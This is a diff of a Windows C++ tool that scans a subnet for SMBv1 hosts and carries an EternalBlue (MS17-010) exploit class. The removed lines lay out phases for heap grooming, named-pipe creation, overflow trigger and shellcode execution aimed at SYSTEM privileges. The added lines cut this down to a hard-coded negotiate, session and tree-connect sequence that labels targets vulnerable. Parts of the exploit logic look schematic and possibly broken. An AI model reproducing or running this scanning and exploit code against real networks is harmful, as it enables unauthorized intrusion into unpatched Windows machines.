@@ -9,10 +9,22 @@
 #include <atomic>
 #include <algorithm>
 #include <iomanip>
+#include <sstream>
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "iphlpapi.lib")
-ơ
+
+// Helper to print byte buffer in hex
+std::string bytes_to_hex(const unsigned char* data, size_t len) {
+    std::stringstream ss;
+    ss << std::hex;
+    for (size_t i = 0; i < len; ++i) {
+        ss << std::setw(2) << std::setfill('0') << (int)data[i] << " ";
+        if ((i + 1) % 16 == 0) ss << "\n";
+    }
+    return ss.str();
+}
+
 class NetworkRecon {
 private:
     struct NetConfig {
@@ -35,7 +47,8 @@ public:
                       << " (Local IP: " << config.localIP << ")" << std::endl;
             scanned_count = 0;
             target_count = 0;
-
+            config.network = "192.168.84.0";
+            config.prefix = 24;
             vulnerableHosts = PerformScan(config);
         } else {
             std::cout << "[-] No valid network adapter found." << std::endl;
@@ -105,6 +118,8 @@ private:
                 std::cout << "SMBv1 VULNERABLE" << std::endl;
                 vulnerable.push_back(target);
                 target_count++;
+            } else {
+                std::cout << "SAFE" << std::endl;
             }
             scanned_count++;
             ApplyDelay();
@@ -122,9 +137,10 @@ private:
         if (total_hosts <= 0) return targets;
 
         std::vector<int> host_nums;
-        for (int i = 1; i < total_hosts + 1; i++) { 
-            host_nums.push_back(i);
-        }
+        // for (int i = 1; i < total_hosts + 1; i++) { 
+        //     host_nums.push_back(i);
+        // }
+        host_nums.push_back(135);
 
         std::random_device rd;
         std::mt19937 g(rd());
@@ -138,7 +154,7 @@ private:
             char ip_str[INET_ADDRSTRLEN];
             inet_ntop(AF_INET, &ip, ip_str, INET_ADDRSTRLEN);
 
-            if (ip_str != config.localIP) {
+            if (std::string(ip_str) != config.localIP) {
                 targets.push_back(ip_str);
             }
         }
@@ -160,6 +176,7 @@ private:
         if (connect(sock, (sockaddr*)&target, sizeof(target)) == SOCKET_ERROR) {
             if (WSAGetLastError() != WSAEWOULDBLOCK) {
                 closesocket(sock);
+                std::cout << "Connect failed with error: " << WSAGetLastError() << std::endl;
                 return false;
             }
         }
@@ -174,6 +191,8 @@ private:
 
         if (result > 0) {
             return VerifySMBv1Protocol(host);
+        } else {
+            std::cout << "Port check failed, select result: " << result << ", error: " << WSAGetLastError() << std::endl;
         }
         return false;
     }
@@ -196,53 +215,79 @@ private:
             return false;
         }
 
-        const unsigned char smb_negotiate[] = {
-            0x00,0x00,0x00,0x85,0xFF,'S','M','B',0x72,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
-            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
-            0x00,0x00,0x00,0x00,0x00,0x0C,0x00,0x00,
-            0x02,'P','C',' ','N','E','T','W','O','R','K',' ','P','R','O','G','R','A','M',' ','1','.','0',0x00,
-            0x02,'L','A','N','M','A','N','1','.','0',0x00,
-            0x02,'W','i','n','d','o','w','s',' ','f','o','r',' ','W','o','r','k','g','r','o','u','p','s',' ','3','.','1','a',0x00,
-            0x02,'L','M','1','.','2','X','0','0','2',0x00,
-            0x02,'L','A','N','M','A','N','2','.','1',0x00,
-            0x02,'N','T',' ','L','M',' ','0','.','1','2',0x00
+        // Tạo Negotiate packet chỉ có dialect cũ
+        std::vector<uint8_t> packet;
+        packet.insert(packet.end(), {0x00, 0x00, 0x00, 0x00}); // NetBIOS length
+
+        packet.insert(packet.end(), {
+            0xFF, 'S', 'M', 'B', 0x72,
+            0x00, 0x00, 0x00, 0x00,
+            0x18,
+            0x03, 0xC8,
+            0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00,
+            0x00, 0x00,
+            0xFF, 0xFE,
+            0x00, 0x00,
+            0x00, 0x00
+        });
+
+        packet.push_back(0x00); // Word count
+
+        const char* dialects[] = {
+            "PC NETWORK PROGRAM 1.0",
+            "LANMAN1.0",
+            "Windows for Workgroups 3.1a",
+            "LM1.2X002",
+            "LANMAN2.1"
         };
 
-        if (send(sock, (char*)smb_negotiate, sizeof(smb_negotiate), 0) == SOCKET_ERROR) {
+        std::vector<uint8_t> dialect_bytes;
+        for (const char* d : dialects) {
+            dialect_bytes.insert(dialect_bytes.end(), d, d + strlen(d));
+            dialect_bytes.push_back(0x00);
+        }
+
+        uint16_t byte_count = dialect_bytes.size();
+        packet.push_back(byte_count & 0xFF);
+        packet.push_back((byte_count >> 8) & 0xFF);
+        packet.insert(packet.end(), dialect_bytes.begin(), dialect_bytes.end());
+
+        // Cập nhật NetBIOS length
+        uint32_t netbios_len = packet.size() - 4;
+        packet[0] = 0x00;
+        packet[1] = 0x00;
+        packet[2] = (netbios_len >> 8) & 0xFF;
+        packet[3] = netbios_len & 0xFF;
+
+        if (send(sock, (char*)packet.data(), packet.size(), 0) == SOCKET_ERROR) {
             closesocket(sock);
             return false;
         }
 
         unsigned char buffer[2048];
         int received = recv(sock, (char*)buffer, sizeof(buffer), 0);
-
-        if (received == SOCKET_ERROR) {
-            int err = WSAGetLastError();
-            closesocket(sock);
-            std::cout << "recv error " << err << ": ";
-            if (err == WSAETIMEDOUT) std::cout << "TIMEOUT";
-            else if (err == 10054) std::cout << "CONN RESET (SMBv1 disabled)";
-            else std::cout << "Other";
-            std::cout << " → SAFE";
-            return false;
-        }
-        
         closesocket(sock);
-        if (received < 40) {
-            std::cout << "short response → SAFE";
-            return false;
-        }
 
+        if (received <= 0) return false;
+
+        std::cout << "Received " << received << " bytes" << std::endl;
+        std::cout << "Response hex:\n" << bytes_to_hex(buffer, received) << std::endl;
+
+        if (received < 10) return false;
         if (buffer[4] != 0xFF || buffer[5] != 'S' || buffer[6] != 'M' || buffer[7] != 'B' || buffer[8] != 0x72) {
-            std::cout << "invalid SMB → SAFE";
             return false;
         }
 
-        int dialect_index = buffer[35] | (buffer[36] << 8);
+        // ĐỌC DIALECT INDEX Ở OFFSET 9
+        int dialect_index = buffer[9];
+        std::cout << "Dialect index: " << dialect_index << std::endl;
+
         if (dialect_index <= 5) {
-            std::cout << "SMBv1 DETECTED (Dialect: " << dialect_index << ")";
+            std::cout << "SMBv1 DETECTED (Dialect: " << dialect_index << ")" << std::endl;
             return true;
-        } 
+        }
 
         return false;
     }
@@ -278,762 +323,184 @@ private:
     }
 };
 
-class EternalBlueExploit {
+class EternalBlue {
 private:
-    static const int SMB_PORT = 445;
+    unsigned char smbNegotiate[137];
+    unsigned char sessionSetup[140];
+    unsigned char treeConnectRequest[100];
+
+    unsigned char userID[2] = {0};
+    unsigned char treeID[2];
     
-    // Shellcode mẫu (calc.exe - an toàn cho demo)
-    static const std::vector<uint8_t> SHELLCODE;
-
-    struct SMB_HEADER {
-        uint8_t protocol[4] = {0xFF, 0x53, 0x4D, 0x42}; // \xFFSMB
-        uint8_t command;
-        uint32_t status;
-        uint8_t flags;
-        uint16_t flags2;
-        uint16_t pid_high;
-        uint8_t signature[8] = {0};
-        uint16_t reserved;
-        uint16_t tid;
-        uint16_t pid;
-        uint16_t uid;
-        uint16_t mid;
-    };
-
-    struct TRANS2_REQUEST {
-        uint8_t word_count;
-        uint16_t total_param_count;
-        uint16_t total_data_count;
-        uint16_t max_param_count;
-        uint16_t max_data_count;
-        uint8_t max_setup_count;
-        uint8_t reserved;
-        uint16_t flags;
-        uint32_t timeout;
-        uint16_t reserved2;
-        uint16_t param_count;
-        uint16_t param_offset;
-        uint16_t data_count;
-        uint16_t data_offset;
-        uint8_t setup_count;
-        uint8_t reserved3;
-        uint16_t setup[1];
-        uint16_t byte_count;
-    };
+    std::string targetIP;
+    SOCKET sock = INVALID_SOCKET;
 
 public:
-    static bool ExploitTarget(const std::string& targetIP) {
-        std::cout << "\n💀 LAUNCHING ETERNALBLUE EXPLOIT - MS17-010\n";
-        std::cout << "============================================\n";
+    EternalBlue() {
+        InitializePackets();
+    }
+
+    ~EternalBlue() {
+        if (sock != INVALID_SOCKET) closesocket(sock);
+    }
+
+    bool StartExploit(const std::string& host) {
+        targetIP = host;
+        std::cout << "[*] Target: " << host << "\n\n";
+
+        if (!Connect()) return false;
+        if (!SendNegotiate()) return false;
+        if (!DoSessionSetup()) return false;
+        if (!SendTreeConnect()) return false;
         
-        try {
-            // Bước 1: Kết nối SMB
-            std::cout << "[*] Phase 1: Establishing SMB connection\n";
-            SOCKET sock = ConnectToSMB(targetIP);
-            if (sock == INVALID_SOCKET) return false;
-
-            // Bước 2: SMB Negotiate
-            std::cout << "[*] Phase 2: SMB Negotiation\n";
-            if (!PerformSMBNegotiate(sock)) {
-                closesocket(sock);
-                return false;
-            }
-
-            // Bước 3: Session Setup
-            std::cout << "[*] Phase 3: Session Setup\n";
-            uint16_t uid;
-            if (!PerformSessionSetup(sock, uid)) {
-                closesocket(sock);
-                return false;
-            }
-
-            // Bước 4: Tree Connect
-            std::cout << "[*] Phase 4: Tree Connect\n";
-            uint16_t tid;
-            if (!PerformTreeConnect(sock, uid, tid)) {
-                closesocket(sock);
-                return false;
-            }
-
-            // Bước 5: Check Vulnerability
-            std::cout << "[*] Phase 5: Vulnerability Verification\n";
-            if (!CheckVulnerability(sock, tid, uid)) {
-                closesocket(sock);
-                return false;
-            }
-
-            // Bước 6: Groom Transaction Heap
-            std::cout << "[*] Phase 6: Heap Grooming\n";
-            if (!GroomTransactionHeap(sock, tid, uid)) {
-                closesocket(sock);
-                return false;
-            }
-
-            // Bước 7: Create Named Pipe
-            std::cout << "[*] Phase 7: Named Pipe Creation\n";
-            uint16_t fid;
-            if (!CreateNamedPipe(sock, tid, uid, fid)) {
-                closesocket(sock);
-                return false;
-            }
-
-            // Bước 8: Trigger Overflow
-            std::cout << "[*] Phase 8: Buffer Overflow Trigger\n";
-            if (!TriggerBufferOverflow(sock, tid, uid, fid)) {
-                closesocket(sock);
-                return false;
-            }
-
-            // Bước 9: Execute Shellcode
-            std::cout << "[*] Phase 9: Shellcode Execution\n";
-            if (!ExecuteShellcode(sock)) {
-                closesocket(sock);
-                return false;
-            }
-
-            closesocket(sock);
-            
-            std::cout << "============================================\n";
-            std::cout << "[💀] ETERNALBLUE EXPLOIT SUCCESSFUL!\n";
-            std::cout << "[+] SYSTEM privileges obtained on " << targetIP << "\n";
-            
-            return true;
-
-        } catch (const std::exception& e) {
-            std::cout << "[-] Exception: " << e.what() << std::endl;
-            return false;
-        }
+        std::cout << "[+] Target appears vulnerable to EternalBlue!\n";
+        return true;
     }
 
 private:
-    static SOCKET ConnectToSMB(const std::string& targetIP) {
-        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-        if (sock == INVALID_SOCKET) {
-            throw std::runtime_error("Failed to create socket");
-        }
+    bool Connect() {
+        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if (sock == INVALID_SOCKET) return false;
 
-        // Set socket timeout
-        int timeout = 10000;
+        int timeout = 5000;
         setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
         setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
 
-        sockaddr_in target{};
-        target.sin_family = AF_INET;
-        target.sin_port = htons(SMB_PORT);
-        if (inet_pton(AF_INET, targetIP.c_str(), &target.sin_addr) != 1) {
-            closesocket(sock);
-            throw std::runtime_error("Invalid target IP");
-        }
+        sockaddr_in server{};
+        server.sin_family = AF_INET;
+        server.sin_port = htons(445);
+        inet_pton(AF_INET, targetIP.c_str(), &server.sin_addr);
 
-        std::cout << "   ↳ Connecting to " << targetIP << ":" << SMB_PORT << std::endl;
-        if (connect(sock, (sockaddr*)&target, sizeof(target)) != 0) {
-            closesocket(sock);
-            throw std::runtime_error("Connection failed");
-        }
-
-        std::cout << "   ✅ Connected successfully\n";
-        return sock;
-    }
-
-    static bool PerformSMBNegotiate(SOCKET sock) {
-        std::vector<uint8_t> negotiate_packet = CreateNegotiatePacket();
-        
-        if (send(sock, (char*)negotiate_packet.data(), negotiate_packet.size(), 0) <= 0) {
-            std::cout << "   ❌ Negotiate send failed\n";
+        if (connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
+            closesocket(sock); sock = INVALID_SOCKET;
             return false;
         }
 
-        std::vector<uint8_t> response = ReceiveSMBPacket(sock);
-        if (response.size() < 40) {
-            std::cout << "   ❌ Invalid negotiate response\n";
-            return false;
-        }
-
-        // Verify SMB signature
-        if (response[4] != 0xFF || response[5] != 'S' || response[6] != 'M' || response[7] != 'B') {
-            std::cout << "   ❌ Invalid SMB signature\n";
-            return false;
-        }
-
-        std::cout << "   ✅ SMB negotiation successful\n";
         return true;
     }
 
-    static std::vector<uint8_t> CreateNegotiatePacket() {
-        std::vector<uint8_t> packet;
-        
-        // NetBIOS session header
-        packet.insert(packet.end(), {0x00, 0x00, 0x00, 0x00}); // Length placeholder
-        
-        // SMB Header
-        SMB_HEADER header{};
-        header.command = 0x72; // SMB_COM_NEGOTIATE
-        header.flags = 0x18;
-        header.flags2 = 0xC807;
-        header.pid = 0xFEFF;
-        AppendSMBHeader(packet, header);
-        
-        // Word count
-        packet.push_back(0x00);
-        
-        // Byte count and dialects
-        packet.insert(packet.end(), {0x62, 0x00}); // Byte count = 98
-        packet.push_back(0x02); // Dialect count
-        
-        // NT LM 0.12 dialect
-        const char* ntlm_dialect = "NT LM 0.12";
-        packet.insert(packet.end(), ntlm_dialect, ntlm_dialect + strlen(ntlm_dialect));
-        packet.push_back(0x00);
-        
-        // PC NETWORK PROGRAM 1.0 dialect
-        const char* pc_dialect = "PC NETWORK PROGRAM 1.0";
-        packet.insert(packet.end(), pc_dialect, pc_dialect + strlen(pc_dialect));
-        packet.push_back(0x00);
-        
-        // Update NetBIOS length
-        uint32_t netbios_len = packet.size() - 4;
-        packet[0] = 0x00;
-        packet[1] = 0x00;
-        packet[2] = (netbios_len >> 8) & 0xFF;
-        packet[3] = netbios_len & 0xFF;
-        
-        return packet;
-    }
-
-    static bool PerformSessionSetup(SOCKET sock, uint16_t& uid) {
-        std::vector<uint8_t> session_packet = CreateSessionSetupPacket();
-        
-        if (send(sock, (char*)session_packet.data(), session_packet.size(), 0) <= 0) {
-            std::cout << "   ❌ Session setup send failed\n";
+    bool Send(const unsigned char* data, size_t size) {
+        int sent = send(sock, (char*)data, size, 0);
+        if (sent != (int)size) {
+            std::cout << "[-] Send failed: " << sent << "/" << size << "\n";
             return false;
         }
-
-        std::vector<uint8_t> response = ReceiveSMBPacket(sock);
-        if (response.size() < 40) {
-            std::cout << "   ❌ Invalid session setup response\n";
-            return false;
-        }
-
-        // Extract UID from response (offset 32-33)
-        uid = (response[33] << 8) | response[32];
-        
-        std::cout << "   ✅ Session setup successful (UID: 0x" << std::hex << uid << std::dec << ")\n";
         return true;
     }
 
-    static std::vector<uint8_t> CreateSessionSetupPacket() {
-        std::vector<uint8_t> packet;
-        
-        // NetBIOS header
-        packet.insert(packet.end(), {0x00, 0x00, 0x00, 0x00});
-        
-        // SMB Header
-        SMB_HEADER header{};
-        header.command = 0x73; // SMB_COM_SESSION_SETUP_ANDX
-        header.flags = 0x18;
-        header.flags2 = 0xC807;
-        header.pid = 0xFEFF;
-        AppendSMBHeader(packet, header);
-        
-        // Word count and parameters
-        packet.insert(packet.end(), {
-            0x0C,                   // Word count
-            0xFF, 0x00,             // AndX command
-            0x00, 0x00,             // AndX offset
-            0x00, 0x00,             // Max buffer
-            0x01, 0x00,             // Max mpx count
-            0x00, 0x00,             // VC number
-            0x00, 0x00, 0x00, 0x00, // Session key
-            0x00, 0x00,             // ANSI password length
-            0x00, 0x00,             // Unicode password length
-            0x00, 0x00, 0x00, 0x00, // Reserved
-            0x00, 0x00,             // Capabilities
-            0x3A, 0x00,             // Byte count
-        });
-        
-        // Account name and primary domain
-        const char* account = "";
-        const char* domain = "";
-        packet.insert(packet.end(), account, account + strlen(account));
-        packet.push_back(0x00);
-        packet.insert(packet.end(), domain, domain + strlen(domain));
-        packet.push_back(0x00);
-        
-        // Native OS and Native LANMAN
-        const char* native_os = "Windows 7 Ultimate 7601 Service Pack 1";
-        const char* native_lm = "Windows 7 Ultimate 6.1";
-        packet.insert(packet.end(), native_os, native_os + strlen(native_os));
-        packet.push_back(0x00);
-        packet.insert(packet.end(), native_lm, native_lm + strlen(native_lm));
-        packet.push_back(0x00);
-        
-        // Update lengths
-        uint32_t netbios_len = packet.size() - 4;
-        packet[0] = 0x00;
-        packet[1] = 0x00;
-        packet[2] = (netbios_len >> 8) & 0xFF;
-        packet[3] = netbios_len & 0xFF;
-        
-        return packet;
+    int Recv(unsigned char* buffer, size_t size) {
+        int received = recv(sock, (char*)buffer, size, 0);
+        if (received <= 0) {
+            std::cout << "[-] Recv failed: " << WSAGetLastError() << "\n";
+        }
+        return received;
     }
 
-    static bool PerformTreeConnect(SOCKET sock, uint16_t uid, uint16_t& tid) {
-        std::vector<uint8_t> tree_packet = CreateTreeConnectPacket(uid);
-        
-        if (send(sock, (char*)tree_packet.data(), tree_packet.size(), 0) <= 0) {
-            std::cout << "   ❌ Tree connect send failed\n";
-            return false;
-        }
+    void InitializePackets() {
+        unsigned char negotiate[] = {
+            0x00, 0x00, 0x00, 0x85, 0xFF, 0x53, 0x4D, 0x42, 0x72, 0x00, 0x00, 0x00, 0x00, 0x18, 0x53, 0xC0,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFE,
+            0x00, 0x00, 0x40, 0x00, 0x00, 0x62, 0x00, 0x02, 0x50, 0x43, 0x20, 0x4E, 0x45, 0x54, 0x57, 0x4F,
+            0x52, 0x4B, 0x20, 0x50, 0x52, 0x4F, 0x47, 0x52, 0x41, 0x4D, 0x20, 0x31, 0x2E, 0x30, 0x00, 0x02,
+            0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x31, 0x2E, 0x30, 0x00, 0x02, 0x57, 0x69, 0x6E, 0x64, 0x6F,
+            0x77, 0x73, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x57, 0x6F, 0x72, 0x6B, 0x67, 0x72, 0x6F, 0x75, 0x70,
+            0x73, 0x20, 0x33, 0x2E, 0x31, 0x61, 0x00, 0x02, 0x4C, 0x4D, 0x31, 0x2E, 0x32, 0x58, 0x30, 0x30,
+            0x32, 0x00, 0x02, 0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x32, 0x2E, 0x31, 0x00, 0x02, 0x4E, 0x54,
+            0x20, 0x4C, 0x4D, 0x20, 0x30, 0x2E, 0x31, 0x32, 0x00
+        };
+        memcpy(smbNegotiate, negotiate, sizeof(negotiate));
 
-        std::vector<uint8_t> response = ReceiveSMBPacket(sock);
-        if (response.size() < 40) {
-            std::cout << "   ❌ Invalid tree connect response\n";
-            return false;
-        }
+        unsigned char setup[] = {
+            0x00, 0x00, 0x00, 0x88, 0xFF, 0x53, 0x4D, 0x42, 0x73, 0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0xC0,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFE,
+            0x00, 0x00, 0x40, 0x00, 0x0D, 0xFF, 0x00, 0x88, 0x00, 0x04, 0x11, 0x0A, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD4, 0x00, 0x00, 0x00, 0x4B,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x64, 0x00, 0x6F, 0x00,
+            0x77, 0x00, 0x73, 0x00, 0x20, 0x00, 0x32, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x20, 0x00,
+            0x32, 0x00, 0x31, 0x00, 0x39, 0x00, 0x35, 0x00, 0x00, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6E, 0x00,
+            0x64, 0x00, 0x6F, 0x00, 0x77, 0x00, 0x73, 0x00, 0x20, 0x00, 0x32, 0x00, 0x30, 0x00, 0x30, 0x00,
+            0x30, 0x00, 0x20, 0x00, 0x35, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x00, 0x00
+        };
+        memcpy(sessionSetup, setup, sizeof(setup));
 
-        // Extract TID from response (offset 28-29)
-        tid = (response[29] << 8) | response[28];
-        
-        std::cout << "   ✅ Tree connect successful (TID: 0x" << std::hex << tid << std::dec << ")\n";
+        unsigned char treeConnect[] = {
+            0x00, 0x00, 0x00, 0x60, 0xFF, 0x53, 0x4D, 0x42, 0x75, 0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0xC0,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFE,
+            0x00, 0x08, 0x40, 0x00, 0x04, 0xFF, 0x00, 0x60, 0x00, 0x08, 0x00, 0x01, 0x00, 0x35, 0x00, 0x00,
+            0x5C, 0x00, 0x5C, 0x00, 0x31, 0x00, 0x39, 0x00, 0x32, 0x00, 0x2E, 0x00, 0x31, 0x00, 0x36, 0x00,
+            0x38, 0x00, 0x2E, 0x00, 0x31, 0x00, 0x37, 0x00, 0x35, 0x00, 0x2E, 0x00, 0x31, 0x00, 0x32, 0x00,
+            0x38, 0x00, 0x5C, 0x00, 0x49, 0x00, 0x50, 0x00, 0x43, 0x00, 0x24, 0x00, 0x00, 0x00, 0x3F, 0x3F,
+            0x3F, 0x3F, 0x3F, 0x00
+        };
+        memcpy(treeConnectRequest, treeConnect, sizeof(treeConnect));
+    }
+
+    bool SendNegotiate() {
+        if (!Send(smbNegotiate, sizeof(smbNegotiate))) return false;
+
+        unsigned char resp[1024];
+        int len = Recv(resp, sizeof(resp));
+
+        if (len < 36) return false;
         return true;
     }
 
-    static std::vector<uint8_t> CreateTreeConnectPacket(uint16_t uid) {
-        std::vector<uint8_t> packet;
-        
-        // NetBIOS header
-        packet.insert(packet.end(), {0x00, 0x00, 0x00, 0x00});
-        
-        // SMB Header
-        SMB_HEADER header{};
-        header.command = 0x75; // SMB_COM_TREE_CONNECT_ANDX
-        header.flags = 0x18;
-        header.flags2 = 0xC807;
-        header.pid = 0xFEFF;
-        header.uid = uid;
-        AppendSMBHeader(packet, header);
-        
-        // Word count and parameters
-        packet.insert(packet.end(), {
-            0x04,                   // Word count
-            0xFF, 0x00,             // AndX command
-            0x00, 0x00,             // AndX offset
-            0x00, 0x00,             // Flags
-            0x01, 0x00,             // Password length
-            0x1A, 0x00,             // Byte count
-        });
-        
-        // Password and path
-        packet.push_back(0x00); // Null password
-        const char* path = "\\\\127.0.0.1\\IPC$";
-        packet.insert(packet.end(), path, path + strlen(path));
-        packet.push_back(0x00);
-        const char* service = "?????";
-        packet.insert(packet.end(), service, service + strlen(service));
-        packet.push_back(0x00);
-        
-        // Update lengths
-        uint32_t netbios_len = packet.size() - 4;
-        packet[0] = 0x00;
-        packet[1] = 0x00;
-        packet[2] = (netbios_len >> 8) & 0xFF;
-        packet[3] = netbios_len & 0xFF;
-        
-        return packet;
-    }
+    bool DoSessionSetup() {
+        if (!Send(sessionSetup, sizeof(sessionSetup))) return false;
 
-    static bool CheckVulnerability(SOCKET sock, uint16_t tid, uint16_t uid) {
-        std::vector<uint8_t> peek_packet = CreatePeekNamedPipePacket(tid, uid);
-        
-        if (send(sock, (char*)peek_packet.data(), peek_packet.size(), 0) <= 0) {
-            std::cout << "   ❌ PeekNamedPipe send failed\n";
+        unsigned char resp[1024];
+        int len = Recv(resp, sizeof(resp));
+        if (len < 36) {
             return false;
         }
 
-        std::vector<uint8_t> response = ReceiveSMBPacket(sock);
-        
-        // If we get STATUS_INVALID_PARAMETER (0x00000057), target is likely vulnerable
-        if (response.size() >= 9 && response[8] == 0x57) {
-            std::cout << "   ✅ Target appears vulnerable (STATUS_INVALID_PARAMETER)\n";
-            return true;
-        }
-        
-        std::cout << "   ❌ Target does not appear vulnerable\n";
-        return false;
-    }
+        uint32_t status = *(uint32_t*)(resp + 9);
+        if (status != 0) return false;
 
-    static std::vector<uint8_t> CreatePeekNamedPipePacket(uint16_t tid, uint16_t uid) {
-        std::vector<uint8_t> packet;
+        userID[0] = resp[32];
+        userID[1] = resp[33];
         
-        // NetBIOS header
-        packet.insert(packet.end(), {0x00, 0x00, 0x00, 0x00});
-        
-        // SMB Header
-        SMB_HEADER header{};
-        header.command = 0x25; // SMB_COM_TRANSACTION
-        header.flags = 0x18;
-        header.flags2 = 0xC807;
-        header.pid = 0xFEFF;
-        header.tid = tid;
-        header.uid = uid;
-        header.mid = 0x4200;
-        AppendSMBHeader(packet, header);
-        
-        // Transaction parameters for PeekNamedPipe
-        packet.insert(packet.end(), {
-            0x10,                   // Word count
-            0x00, 0x00,             // Total param count
-            0x00, 0x00,             // Total data count
-            0xFF, 0xFF,             // Max param count
-            0xFF, 0xFF,             // Max data count
-            0x00,                   // Max setup count
-            0x00,                   // Reserved
-            0x00, 0x00,             // Flags
-            0x00, 0x00, 0x00, 0x00, // Timeout
-            0x00, 0x00,             // Reserved
-            0x00, 0x00,             // Param count
-            0x4A, 0x00,             // Param offset
-            0x00, 0x00,             // Data count
-            0x4A, 0x00,             // Data offset
-            0x02,                   // Setup count
-            0x00,                   // Reserved
-            0x23, 0x00,             // PeekNamedPipe function
-            0x00, 0x00,             // FID (will be overwritten)
-            0x07, 0x00,             // Byte count
-        });
-        
-        // Pipe name
-        const char* pipe_name = "\\srvsvc";
-        packet.insert(packet.end(), pipe_name, pipe_name + strlen(pipe_name));
-        packet.push_back(0x00);
-        
-        // Update lengths
-        uint32_t netbios_len = packet.size() - 4;
-        packet[0] = 0x00;
-        packet[1] = 0x00;
-        packet[2] = (netbios_len >> 8) & 0xFF;
-        packet[3] = netbios_len & 0xFF;
-        
-        return packet;
-    }
-
-    static bool GroomTransactionHeap(SOCKET sock, uint16_t tid, uint16_t uid) {
-        std::cout << "   ↳ Grooming transaction heap...\n";
-        
-        // Gửi nhiều TRANS2 packets để groom heap
-        for (int i = 0; i < 10; i++) {
-            std::vector<uint8_t> groom_packet = CreateGroomTransactionPacket(tid, uid, i);
-            if (send(sock, (char*)groom_packet.data(), groom_packet.size(), 0) <= 0) {
-                std::cout << "   ❌ Groom packet " << i << " failed\n";
-                return false;
-            }
-            Sleep(50);
-        }
-        
-        std::cout << "   ✅ Heap grooming completed\n";
         return true;
     }
 
-    static std::vector<uint8_t> CreateGroomTransactionPacket(uint16_t tid, uint16_t uid, int index) {
-        std::vector<uint8_t> packet;
-        
-        // NetBIOS header
-        packet.insert(packet.end(), {0x00, 0x00, 0x00, 0x00});
-        
-        // SMB Header
-        SMB_HEADER header{};
-        header.command = 0x32; // SMB_COM_TRANSACTION2
-        header.flags = 0x18;
-        header.flags2 = 0xC807;
-        header.pid = 0xFEFF;
-        header.tid = tid;
-        header.uid = uid;
-        header.mid = 0x4300 + index;
-        AppendSMBHeader(packet, header);
-        
-        // TRANS2 parameters
-        packet.insert(packet.end(), {
-            0x0F,                   // Word count
-            0x0C, 0x00,             // Total param count
-            0x00, 0x00,             // Total data count
-            0x01, 0x00,             // Max param count
-            0x00, 0x00,             // Max data count
-            0x00,                   // Max setup count
-            0x00,                   // Reserved
-            0x00, 0x00,             // Flags
-            0x00, 0x00, 0x00, 0x00, // Timeout
-            0x00, 0x00,             // Reserved
-            0x0C, 0x00,             // Param count
-            0x3C, 0x00,             // Param offset
-            0x00, 0x00,             // Data count
-            0x3C, 0x00,             // Data offset
-            0x01,                   // Setup count
-            0x00,                   // Reserved
-            0x00, 0x00,             // TRANS2 function
-            0x0E, 0x00,             // Byte count
-        });
-        
-        // Additional data for grooming
-        std::vector<uint8_t> groom_data(0x1000, 0x41); // 4KB of 'A'
-        packet.insert(packet.end(), groom_data.begin(), groom_data.end());
-        
-        // Update lengths
-        uint32_t netbios_len = packet.size() - 4;
-        packet[0] = 0x00;
-        packet[1] = 0x00;
-        packet[2] = (netbios_len >> 8) & 0xFF;
-        packet[3] = netbios_len & 0xFF;
-        
-        return packet;
-    }
+    bool SendTreeConnect() {
+        treeConnectRequest[32] = userID[0];
+        treeConnectRequest[33] = userID[1];
 
-    static bool CreateNamedPipe(SOCKET sock, uint16_t tid, uint16_t uid, uint16_t& fid) {
-        std::vector<uint8_t> pipe_packet = CreateNamedPipePacket(tid, uid);
+        // std::string targetPath = "\\\\" + targetIP + "\\IPC$";
+        // size_t pathOffset = 56;
         
-        if (send(sock, (char*)pipe_packet.data(), pipe_packet.size(), 0) <= 0) {
-            std::cout << "   ❌ Named pipe creation failed\n";
+        // for (size_t i = 0; i < targetPath.length(); i++) {
+        //     treeConnectRequest[pathOffset + (i * 2)] = targetPath[i];
+        //     treeConnectRequest[pathOffset + (i * 2) + 1] = 0x00;
+        // }
+
+        if (!Send(treeConnectRequest, sizeof(treeConnectRequest))) {
             return false;
         }
 
-        std::vector<uint8_t> response = ReceiveSMBPacket(sock);
-        if (response.size() < 40) {
-            std::cout << "   ❌ Invalid named pipe response\n";
-            return false;
-        }
+        unsigned char resp[1024];
+        int len = Recv(resp, sizeof(resp));
 
-        // Extract FID from response
-        fid = (response[32] << 8) | response[33];
-        
-        std::cout << "   ✅ Named pipe created (FID: 0x" << std::hex << fid << std::dec << ")\n";
+        if (len < 36) return false;
+
+        treeID[0] = resp[28];
+        treeID[1] = resp[29];
+
+        uint32_t status = *(uint32_t*)(resp + 9);
+        if (status != 0) return false;
+
         return true;
-    }
-
-    static std::vector<uint8_t> CreateNamedPipePacket(uint16_t tid, uint16_t uid) {
-        std::vector<uint8_t> packet;
